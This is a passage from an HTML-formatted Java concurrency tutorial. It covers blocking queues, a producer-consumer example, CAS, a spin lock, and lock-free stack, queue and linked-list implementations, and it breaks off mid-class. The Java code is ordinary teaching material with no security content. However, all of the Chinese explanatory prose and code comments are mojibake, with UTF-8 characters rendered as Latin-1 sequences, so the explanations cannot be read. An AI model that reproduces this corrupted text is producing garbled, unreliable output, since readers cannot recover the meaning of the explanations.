BlockingQueue&lt;Task&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityBlockingQueue</span>&lt;&gt;(
    <span class="hljs-number">10</span>, 
    (t1, t2) -&gt; t1.getPriority() - t2.getPriority()
);
</code></pre>
<p><strong>4. DelayQueue</strong></p>
<p>å»¶è¿Ÿé˜Ÿåˆ—ï¼Œå…ƒç´ åªæœ‰åœ¨å»¶è¿Ÿæ—¶é—´åˆ°è¾¾åæ‰èƒ½è¢«å–å‡ºï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åˆ›å»ºå»¶è¿Ÿé˜Ÿåˆ—</span>
DelayQueue&lt;DelayedTask&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DelayQueue</span>&lt;&gt;();

<span class="hljs-comment">// æ·»åŠ å»¶è¿Ÿä»»åŠ¡</span>
queue.put(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DelayedTask</span>(<span class="hljs-string">"ä»»åŠ¡1"</span>, <span class="hljs-number">5</span>, TimeUnit.SECONDS));

<span class="hljs-comment">// å–å‡ºåˆ°æœŸçš„ä»»åŠ¡</span>
<span class="hljs-type">DelayedTask</span> <span class="hljs-variable">task</span> <span class="hljs-operator">=</span> queue.take();
</code></pre>
<p><strong>5. SynchronousQueue</strong></p>
<p>åŒæ­¥é˜Ÿåˆ—ï¼Œä¸å­˜å‚¨å…ƒç´ ï¼Œæ¯ä¸ªæ’å…¥æ“ä½œå¿…é¡»ç­‰å¾…å¦ä¸€ä¸ªçº¿ç¨‹çš„ç§»é™¤æ“ä½œï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åˆ›å»ºåŒæ­¥é˜Ÿåˆ—</span>
BlockingQueue&lt;String&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SynchronousQueue</span>&lt;&gt;();

<span class="hljs-comment">// ç”Ÿäº§è€…çº¿ç¨‹</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">try</span> {
        queue.put(<span class="hljs-string">"æ•°æ®"</span>);
        System.out.println(<span class="hljs-string">"æ•°æ®å·²æ”¾å…¥"</span>);
    } <span class="hljs-keyword">catch</span> (InterruptedException e) {
        e.printStackTrace();
    }
}).start();

<span class="hljs-comment">// æ¶ˆè´¹è€…çº¿ç¨‹</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> queue.take();
        System.out.println(<span class="hljs-string">"å–å‡ºæ•°æ®ï¼š"</span> + data);
    } <span class="hljs-keyword">catch</span> (InterruptedException e) {
        e.printStackTrace();
    }
}).start();
</code></pre>
<h4 data-id="heading-95">3.5 ç”Ÿäº§è€…-æ¶ˆè´¹è€…æ¨¡å¼ç¤ºä¾‹</h4>
<p>ä½¿ç”¨<code>BlockingQueue</code>å®ç°ç”Ÿäº§è€…-æ¶ˆè´¹è€…æ¨¡å¼ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åˆ›å»ºé˜»å¡é˜Ÿåˆ—</span>
BlockingQueue&lt;String&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="hljs-number">10</span>);

<span class="hljs-comment">// ç”Ÿäº§è€…</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Producer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span> {
    <span class="hljs-keyword">private</span> BlockingQueue&lt;String&gt; queue;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Producer</span><span class="hljs-params">(BlockingQueue&lt;String&gt; queue)</span> {
        <span class="hljs-built_in">this</span>.queue = queue;
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {
                <span class="hljs-type">String</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Item-"</span> + i;
                queue.put(item);  <span class="hljs-comment">// é˜»å¡æ’å…¥</span>
                System.out.println(<span class="hljs-string">"ç”Ÿäº§ï¼š"</span> + item);
                Thread.sleep(<span class="hljs-number">100</span>);
            }
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }
}

<span class="hljs-comment">// æ¶ˆè´¹è€…</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Consumer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span> {
    <span class="hljs-keyword">private</span> BlockingQueue&lt;String&gt; queue;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Consumer</span><span class="hljs-params">(BlockingQueue&lt;String&gt; queue)</span> {
        <span class="hljs-built_in">this</span>.queue = queue;
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
                <span class="hljs-type">String</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> queue.take();  <span class="hljs-comment">// é˜»å¡å–å‡º</span>
                System.out.println(<span class="hljs-string">"æ¶ˆè´¹ï¼š"</span> + item);
                Thread.sleep(<span class="hljs-number">200</span>);
            }
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProducerConsumerDemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        BlockingQueue&lt;String&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="hljs-number">10</span>);
        
        <span class="hljs-comment">// å¯åŠ¨ç”Ÿäº§è€…</span>
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Producer</span>(queue)).start();
        
        <span class="hljs-comment">// å¯åŠ¨æ¶ˆè´¹è€…</span>
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Consumer</span>(queue)).start();
    }
}
</code></pre>
<h2 data-id="heading-96">4. æ— é”ç¼–ç¨‹</h2>
<h4 data-id="heading-97">4.1 æ— é”ç¼–ç¨‹æ¦‚è¿°</h4>
<h5 data-id="heading-98">4.1.1 ä»€ä¹ˆæ˜¯æ— é”ç¼–ç¨‹</h5>
<p>æ— é”ç¼–ç¨‹ï¼ˆLock-Free Programmingï¼‰æ˜¯ä¸€ç§å¹¶å‘ç¼–ç¨‹æŠ€æœ¯ï¼Œå®ƒä¸ä½¿ç”¨ä¼ ç»Ÿçš„é”æœºåˆ¶ï¼ˆå¦‚synchronizedã€ReentrantLockç­‰ï¼‰ï¼Œè€Œæ˜¯é€šè¿‡åŸå­æ“ä½œï¼ˆå¦‚CASï¼‰æ¥å®ç°çº¿ç¨‹å®‰å…¨ã€‚</p>
<p><strong>æ— é”ç¼–ç¨‹çš„æ ¸å¿ƒæ€æƒ³ï¼š</strong></p>
<ul>
<li>ä½¿ç”¨åŸå­æ“ä½œï¼ˆCASï¼‰æ¥ä¿è¯æ•°æ®çš„ä¸€è‡´æ€§</li>
<li>é€šè¿‡è‡ªæ—‹é‡è¯•æ¥å¤„ç†ç«äº‰</li>
<li>é¿å…çº¿ç¨‹é˜»å¡å’Œä¸Šä¸‹æ–‡åˆ‡æ¢</li>
</ul>
<p><strong>æ— é”ç¼–ç¨‹çš„ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li><strong>é«˜æ€§èƒ½</strong>ï¼šé¿å…äº†é”å¸¦æ¥çš„é˜»å¡å’Œä¸Šä¸‹æ–‡åˆ‡æ¢å¼€é”€</li>
<li><strong>å¯æ‰©å±•æ€§å¥½</strong>ï¼šä¸ä¼šå› ä¸ºé”ç«äº‰å¯¼è‡´æ€§èƒ½ä¸‹é™</li>
<li><strong>é¿å…æ­»é”</strong>ï¼šæ²¡æœ‰é”ï¼Œè‡ªç„¶ä¸ä¼šæœ‰æ­»é”é—®é¢˜</li>
<li><strong>å“åº”æ€§å¥½</strong>ï¼šçº¿ç¨‹ä¸ä¼šè¢«é˜»å¡ï¼Œå¯ä»¥å¿«é€Ÿå“åº”</li>
</ul>
<p><strong>æ— é”ç¼–ç¨‹çš„æŒ‘æˆ˜ï¼š</strong></p>
<ul>
<li><strong>å®ç°å¤æ‚</strong>ï¼šéœ€è¦ä»”ç»†è®¾è®¡ç®—æ³•ï¼Œç¡®ä¿æ­£ç¡®æ€§</li>
<li><strong>ABAé—®é¢˜</strong>ï¼šéœ€è¦å¤„ç†ABAé—®é¢˜ï¼ˆä½¿ç”¨ç‰ˆæœ¬å·æˆ–æ—¶é—´æˆ³ï¼‰</li>
<li><strong>è‡ªæ—‹å¼€é”€</strong>ï¼šåœ¨é«˜ç«äº‰æƒ…å†µä¸‹ï¼Œè‡ªæ—‹ä¼šæ¶ˆè€—CPUèµ„æº</li>
<li><strong>å†…å­˜å¯è§æ€§</strong>ï¼šéœ€è¦æ­£ç¡®ä½¿ç”¨volatileæˆ–å†…å­˜å±éšœ</li>
</ul>
<h5 data-id="heading-99">4.1.2 æ— é”ç¼–ç¨‹ vs æœ‰é”ç¼–ç¨‹</h5>
<p><strong>æœ‰é”ç¼–ç¨‹ï¼ˆä¼ ç»Ÿæ–¹å¼ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨synchronized</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        count++;  <span class="hljs-comment">// éœ€è¦è·å–é”æ‰èƒ½æ‰§è¡Œ</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">get</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> count;  <span class="hljs-comment">// éœ€è¦è·å–é”æ‰èƒ½è¯»å–</span>
    }
}
</code></pre>
<p><strong>æ— é”ç¼–ç¨‹ï¼ˆCASæ–¹å¼ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨AtomicIntegerï¼ˆå†…éƒ¨ä½¿ç”¨CASï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        count.incrementAndGet();  <span class="hljs-comment">// ä½¿ç”¨CASï¼Œæ— éœ€é”</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">get</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> count.get();  <span class="hljs-comment">// ç›´æ¥è¯»å–ï¼Œæ— éœ€é”</span>
    }
}
</code></pre>
<p><strong>æ€§èƒ½å¯¹æ¯”ï¼š</strong></p>
<ul>
<li>ä½ç«äº‰åœºæ™¯ï¼šæ— é”ç¼–ç¨‹æ€§èƒ½ç•¥å¥½</li>
<li>é«˜ç«äº‰åœºæ™¯ï¼šæ— é”ç¼–ç¨‹æ€§èƒ½æ˜æ˜¾æ›´å¥½ï¼ˆé¿å…é˜»å¡ï¼‰</li>
<li>æç«¯ç«äº‰åœºæ™¯ï¼šæœ‰é”ç¼–ç¨‹å¯èƒ½æ›´å¥½ï¼ˆé¿å…CPUç©ºè½¬ï¼‰</li>
</ul>
<h4 data-id="heading-100">4.2 CASæ— é”ç®—æ³•</h4>
<h5 data-id="heading-101">4.2.1 CASæ“ä½œè¯¦è§£</h5>
<p>CASï¼ˆCompare-And-Swapï¼‰æ˜¯åŸå­æ“ä½œï¼Œç”¨äºå®ç°æ— é”ç¼–ç¨‹ã€‚</p>
<p><strong>CASæ“ä½œçš„å®šä¹‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// CASæ“ä½œçš„ä¼ªä»£ç </span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSwap</span><span class="hljs-params">(å†…å­˜åœ°å€, æœŸæœ›å€¼, æ–°å€¼)</span> {
    <span class="hljs-keyword">if</span> (å†…å­˜åœ°å€çš„å€¼ == æœŸæœ›å€¼) {
        å†…å­˜åœ°å€çš„å€¼ = æ–°å€¼;
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
}
</code></pre>
<p><strong>Javaä¸­çš„CASæ“ä½œï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// AtomicIntegerçš„CASæ“ä½œ</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AtomicInteger</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> value;
    
    <span class="hljs-comment">// CASæ“ä½œï¼šå¦‚æœå½“å‰å€¼æ˜¯expectï¼Œåˆ™æ›´æ–°ä¸ºupdate</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSet</span><span class="hljs-params">(<span class="hljs-type">int</span> expect, <span class="hljs-type">int</span> update)</span> {
        <span class="hljs-keyword">return</span> unsafe.compareAndSwapInt(<span class="hljs-built_in">this</span>, valueOffset, expect, update);
    }
    
    <span class="hljs-comment">// è‡ªå¢æ“ä½œï¼ˆä½¿ç”¨CASå®ç°ï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">incrementAndGet</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">for</span> (;;) {
            <span class="hljs-type">int</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> get();
            <span class="hljs-type">int</span> <span class="hljs-variable">next</span> <span class="hljs-operator">=</span> current + <span class="hljs-number">1</span>;
            <span class="hljs-keyword">if</span> (compareAndSet(current, next))
                <span class="hljs-keyword">return</span> next;
            <span class="hljs-comment">// CASå¤±è´¥ï¼Œé‡è¯•</span>
        }
    }
}
</code></pre>
<p><strong>CASæ“ä½œçš„ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li><strong>åŸå­æ€§</strong>ï¼šCASæ“ä½œæ˜¯åŸå­çš„ï¼Œä¸ä¼šè¢«ä¸­æ–­</li>
<li><strong>ä¹è§‚é”</strong>ï¼šå‡è®¾æ²¡æœ‰ç«äº‰ï¼Œå¦‚æœå¤±è´¥å°±é‡è¯•</li>
<li><strong>æ— é˜»å¡</strong>ï¼šä¸ä¼šå¯¼è‡´çº¿ç¨‹é˜»å¡</li>
</ul>
<h5 data-id="heading-102">4.2.2 è‡ªæ—‹é”</h5>
<p>è‡ªæ—‹é”æ˜¯ä¸€ç§åŸºäºCASçš„é”å®ç°ï¼Œçº¿ç¨‹åœ¨è·å–é”å¤±è´¥æ—¶ä¼šè‡ªæ—‹ï¼ˆå¾ªç¯é‡è¯•ï¼‰ï¼Œè€Œä¸æ˜¯é˜»å¡ã€‚</p>
<p><strong>è‡ªæ—‹é”çš„å®ç°ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpinLock</span> {
    <span class="hljs-keyword">private</span> AtomicReference&lt;Thread&gt; owner = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicReference</span>&lt;&gt;();
    
    <span class="hljs-comment">// è·å–é”</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Thread</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> Thread.currentThread();
        <span class="hljs-comment">// è‡ªæ—‹ç­‰å¾…ï¼Œç›´åˆ°æˆåŠŸè·å–é”</span>
        <span class="hljs-keyword">while</span> (!owner.compareAndSet(<span class="hljs-literal">null</span>, current)) {
            <span class="hljs-comment">// è‡ªæ—‹ï¼šç©ºå¾ªç¯ï¼Œç­‰å¾…é”é‡Šæ”¾</span>
        }
    }
    
    <span class="hljs-comment">// é‡Šæ”¾é”</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unlock</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Thread</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> Thread.currentThread();
        <span class="hljs-comment">// åªæœ‰æŒæœ‰é”çš„çº¿ç¨‹æ‰èƒ½é‡Šæ”¾</span>
        owner.compareAndSet(current, <span class="hljs-literal">null</span>);
    }
}
</code></pre>
<p><strong>è‡ªæ—‹é”çš„ä½¿ç”¨ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">SpinLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpinLock</span>();

<span class="hljs-comment">// çº¿ç¨‹1</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    lock.lock();
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// ä¸´ç•ŒåŒºä»£ç </span>
        System.out.println(<span class="hljs-string">"çº¿ç¨‹1æ‰§è¡Œ"</span>);
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}).start();

<span class="hljs-comment">// çº¿ç¨‹2</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    lock.lock();
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// ä¸´ç•ŒåŒºä»£ç </span>
        System.out.println(<span class="hljs-string">"çº¿ç¨‹2æ‰§è¡Œ"</span>);
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}).start();
</code></pre>
<p><strong>è‡ªæ—‹é”çš„ä¼˜ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li><strong>ä¼˜ç‚¹</strong>ï¼šé¿å…çº¿ç¨‹é˜»å¡å’Œä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œå“åº”å¿«</li>
<li><strong>ç¼ºç‚¹</strong>ï¼šå ç”¨CPUèµ„æºï¼Œä¸é€‚åˆé•¿æ—¶é—´æŒæœ‰é”çš„åœºæ™¯</li>
</ul>
<h5 data-id="heading-103">4.2.3 æ— é”æ ˆ</h5>
<p>ä½¿ç”¨CASå®ç°çš„æ— é”æ ˆï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LockFreeStack</span>&lt;E&gt; {
    <span class="hljs-comment">// æ ˆé¡¶èŠ‚ç‚¹</span>
    <span class="hljs-keyword">private</span> AtomicReference&lt;Node&lt;E&gt;&gt; top = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicReference</span>&lt;&gt;();
    
    <span class="hljs-comment">// èŠ‚ç‚¹ç±»</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span>&lt;E&gt; {
        E item;
        Node&lt;E&gt; next;
        
        Node(E item) {
            <span class="hljs-built_in">this</span>.item = item;
        }
    }
    
    <span class="hljs-comment">// å…¥æ ˆ</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">push</span><span class="hljs-params">(E item)</span> {
        Node&lt;E&gt; newHead = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>&lt;&gt;(item);
        Node&lt;E&gt; oldHead;
        <span class="hljs-keyword">do</span> {
            oldHead = top.get();
            newHead.next = oldHead;
        } <span class="hljs-keyword">while</span> (!top.compareAndSet(oldHead, newHead));
    }
    
    <span class="hljs-comment">// å‡ºæ ˆ</span>
    <span class="hljs-keyword">public</span> E <span class="hljs-title function_">pop</span><span class="hljs-params">()</span> {
        Node&lt;E&gt; oldHead;
        Node&lt;E&gt; newHead;
        <span class="hljs-keyword">do</span> {
            oldHead = top.get();
            <span class="hljs-keyword">if</span> (oldHead == <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;  <span class="hljs-comment">// æ ˆä¸ºç©º</span>
            }
            newHead = oldHead.next;
        } <span class="hljs-keyword">while</span> (!top.compareAndSet(oldHead, newHead));
        <span class="hljs-keyword">return</span> oldHead.item;
    }
}
</code></pre>
<p><strong>ä½¿ç”¨ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java">LockFreeStack&lt;String&gt; stack = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LockFreeStack</span>&lt;&gt;();

<span class="hljs-comment">// å¤šä¸ªçº¿ç¨‹åŒæ—¶æ“ä½œæ ˆ</span>
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> i;
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
        stack.push(<span class="hljs-string">"Item-"</span> + index);
        <span class="hljs-type">String</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> stack.pop();
        System.out.println(<span class="hljs-string">"å¼¹å‡ºï¼š"</span> + item);
    }).start();
}
</code></pre>
<h5 data-id="heading-104">4.2.4 æ— é”é˜Ÿåˆ—</h5>
<p>ä½¿ç”¨CASå®ç°çš„æ— é”é˜Ÿåˆ—ï¼ˆç®€åŒ–ç‰ˆï¼‰ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LockFreeQueue</span>&lt;E&gt; {
    <span class="hljs-comment">// å¤´èŠ‚ç‚¹ï¼ˆå“¨å…µèŠ‚ç‚¹ï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Node&lt;E&gt; dummy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>&lt;&gt;(<span class="hljs-literal">null</span>);
    <span class="hljs-keyword">private</span> AtomicReference&lt;Node&lt;E&gt;&gt; head = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicReference</span>&lt;&gt;(dummy);
    <span class="hljs-keyword">private</span> AtomicReference&lt;Node&lt;E&gt;&gt; tail = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicReference</span>&lt;&gt;(dummy);
    
    <span class="hljs-comment">// èŠ‚ç‚¹ç±»</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span>&lt;E&gt; {
        <span class="hljs-keyword">volatile</span> E item;
        AtomicReference&lt;Node&lt;E&gt;&gt; next = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicReference</span>&lt;&gt;();
        
        Node(E item) {
            <span class="hljs-built_in">this</span>.item = item;
        }
    }
    
    <span class="hljs-comment">// å…¥é˜Ÿ</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">enqueue</span><span class="hljs-params">(E item)</span> {
        Node&lt;E&gt; newNode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>&lt;&gt;(item);
        Node&lt;E&gt; prevTail;
        Node&lt;E&gt; prevTailNext;
        
        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
            prevTail = tail.get();
            prevTailNext = prevTail.next.get();
            
            <span class="hljs-comment">// æ£€æŸ¥tailæ˜¯å¦è¢«å…¶ä»–çº¿ç¨‹æ›´æ–°</span>
            <span class="hljs-keyword">if</span> (prevTail == tail.get()) {
                <span class="hljs-keyword">if</span> (prevTailNext == <span class="hljs-literal">null</span>) {
                    <span class="hljs-comment">// å°è¯•å°†æ–°èŠ‚ç‚¹é“¾æ¥åˆ°é˜Ÿå°¾</span>
                    <span class="hljs-keyword">if</span> (prevTail.next.compareAndSet(<span class="hljs-literal">null</span>, newNode)) {
                        <span class="hljs-comment">// æ›´æ–°tailæŒ‡é’ˆ</span>
                        tail.compareAndSet(prevTail, newNode);
                        <span class="hljs-keyword">return</span>;
                    }
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-comment">// å¸®åŠ©å…¶ä»–çº¿ç¨‹æ›´æ–°tail</span>
                    tail.compareAndSet(prevTail, prevTailNext);
                }
            }
        }
    }
    
    <span class="hljs-comment">// å‡ºé˜Ÿ</span>
    <span class="hljs-keyword">public</span> E <span class="hljs-title function_">dequeue</span><span class="hljs-params">()</span> {
        Node&lt;E&gt; headNode;
        Node&lt;E&gt; nextNode;
        
        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
            headNode = head.get();
            nextNode = headNode.next.get();
            
            <span class="hljs-keyword">if</span> (headNode == head.get()) {
                <span class="hljs-keyword">if</span> (nextNode == <span class="hljs-literal">null</span>) {
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;  <span class="hljs-comment">// é˜Ÿåˆ—ä¸ºç©º</span>
                }
                <span class="hljs-comment">// å°è¯•æ›´æ–°headæŒ‡é’ˆ</span>
                <span class="hljs-keyword">if</span> (head.compareAndSet(headNode, nextNode)) {
                    <span class="hljs-keyword">return</span> nextNode.item;
                }
            }
        }
    }
}
</code></pre>
<p><strong>ä½¿ç”¨ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java">LockFreeQueue&lt;String&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LockFreeQueue</span>&lt;&gt;();

<span class="hljs-comment">// ç”Ÿäº§è€…çº¿ç¨‹</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
        queue.enqueue(<span class="hljs-string">"Item-"</span> + i);
        System.out.println(<span class="hljs-string">"å…¥é˜Ÿï¼šItem-"</span> + i);
    }
}).start();

<span class="hljs-comment">// æ¶ˆè´¹è€…çº¿ç¨‹</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
        <span class="hljs-type">String</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> queue.dequeue();
        <span class="hljs-keyword">if</span> (item != <span class="hljs-literal">null</span>) {
            System.out.println(<span class="hljs-string">"å‡ºé˜Ÿï¼š"</span> + item);
        }
    }
}).start();
</code></pre>
<h4 data-id="heading-105">4.3 æ— é”æ•°æ®ç»“æ„</h4>
<h5 data-id="heading-106">4.3.1 æ— é”é“¾è¡¨</h5>
<p>æ— é”é“¾è¡¨çš„å®ç°æ¯”è¾ƒå¤æ‚ï¼Œè¿™é‡Œç»™å‡ºä¸€ä¸ªç®€åŒ–ç‰ˆæœ¬ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LockFreeLinkedList</span>&lt;E&gt; {
    <span class="hljs-keyword">private</span> AtomicReference&lt;Node&lt;E&gt;&gt; head = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicReference</span>&lt;&gt;();
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span>&lt;E&gt; {
        E item;
        AtomicReference&lt;Node&lt;E&gt;&gt; next = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicReference</span>&lt;&gt;();
        <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">marked</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// æ ‡è®°èŠ‚ç‚¹æ˜¯å¦è¢«åˆ é™¤</span>
        
